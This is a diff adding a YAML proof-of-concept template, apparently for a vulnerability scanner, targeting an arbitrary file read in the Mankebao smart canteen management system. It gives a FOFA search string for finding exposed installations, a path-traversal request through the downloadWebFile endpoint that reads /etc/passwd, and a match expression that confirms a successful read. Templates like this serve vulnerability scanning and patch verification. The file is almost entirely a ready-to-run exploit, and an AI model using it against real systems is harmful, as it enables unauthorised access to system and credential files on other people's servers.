@@ -1,0 +1,15 @@
+id: poc-yaml-mankebao-downloadwebfile-anyfile-read
+info:
+  name: 满客宝智慧食堂系统 downloadWebFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 满客宝智慧食堂系统
+  fofa: body="满客宝后台管理系统"
+requests:
+- method: GET
+  path: /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
